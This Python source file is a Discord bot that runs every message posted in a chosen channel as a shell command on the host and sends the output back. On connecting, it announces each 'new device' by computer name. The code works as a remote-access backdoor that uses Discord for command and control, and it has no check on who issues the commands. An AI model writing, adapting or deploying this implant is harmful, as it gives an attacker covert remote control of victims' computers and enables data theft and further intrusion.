import discord
import asyncio
import subprocess
import os

TOKEN = 'BOT_TOKEN'
CHANNEL_ID = CHANNEL_IDD  # Replace with your channel ID for alerts
TARGET_CHANNEL_ID = CHANNEL_IDD  # Replace with the channel ID where commands will be executed

intents = discord.Intents.default()
intents.messages = True
intents.message_content = True

client = discord.Client(intents=intents)

current_dir = os.getcwd()

async def execute_command(command):
    global current_dir
    process = await asyncio.create_subprocess_shell(
        command,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
        cwd=current_dir
    )

    stdout, stderr = await process.communicate()

    if process.returncode == 0:
        output = stdout.decode()
        # Update the current directory if the command changes it
        if command.startswith('cd '):
            new_dir = command[3:]
            if new_dir == '..':
                current_dir = os.path.dirname(current_dir)
            else:
                current_dir = os.path.join(current_dir, new_dir)
                current_dir = os.path.abspath(current_dir)
        return output
    else:
        return stderr.decode()

async def send_long_message(channel, message):
    while len(message) > 2000:
        await channel.send(message[:2000])
        message = message[2000:]
    if message:
        await channel.send(message)

@client.event
async def on_ready():
    print(f'We have logged in as {client.user}')
    channel = client.get_channel(CHANNEL_ID)
    if channel:
        await channel.send(f'Bot connected to a new device: {os.getenv("COMPUTERNAME")}')

@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if message.channel.id == TARGET_CHANNEL_ID and message.content.strip():
        output = await execute_command(message.content)
        await send_long_message(message.channel, f'```\n{output}\n```')

client.run(TOKEN)